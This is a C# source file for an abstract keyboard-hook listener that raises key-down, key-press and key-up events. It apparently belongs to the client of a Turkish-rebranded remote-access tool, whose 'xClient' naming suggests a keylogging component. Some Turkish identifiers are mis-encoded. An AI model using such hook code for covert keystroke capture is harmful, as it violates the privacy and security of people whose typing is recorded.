using System.Collections.Generic;
using System.Windows.Forms;
using xClient.KuuhakuÇekirdek.MouseKeyHook.WinApi;

namespace xClient.KuuhakuÇekirdek.MouseKeyHook.Implementation
{
    internal abstract class KeyListener : BaseListener, KlavyeEylemleri
    {
        protected KeyListener(Subscribe subscribe)
            : base(subscribe)
        {
        }

        public event KeyEventHandler KeyDown;
        public event KeyPressEventHandler KeyPress;
        public event KeyEventHandler KeyUp;

        public void InvokeKeyDown(EventArgsExtKlavye e)
        {
            var handler = KeyDown;
            if (handler == null || e.Handled || !e.IsKeyDown)
            {
                return;
            }
            handler(this, e);
        }

        public void InvokeKeyPress(EventArgsExtTuþBasýmý e)
        {
            var handler = KeyPress;
            if (handler == null || e.Handled || e.IsNonChar)
            {
                return;
            }
            handler(this, e);
        }

        public void InvokeKeyUp(EventArgsExtKlavye e)
        {
            var handler = KeyUp;
            if (handler == null || e.Handled || !e.IsKeyUp)
            {
                return;
            }
            handler(this, e);
        }

        protected override bool Callback(CallbackData data)
        {
            var eDownUp = GetDownUpEventArgs(data);
            var pressEventArgs = GetPressEventArgs(data);

            InvokeKeyDown(eDownUp);
            foreach (var pressEventArg in pressEventArgs)
            {
                InvokeKeyPress(pressEventArg);    
            }
            
            InvokeKeyUp(eDownUp);

            return !eDownUp.Handled;
        }

        protected abstract IEnumerable<EventArgsExtTuþBasýmý> GetPressEventArgs(CallbackData data);
        protected abstract EventArgsExtKlavye GetDownUpEventArgs(CallbackData data);
    }
}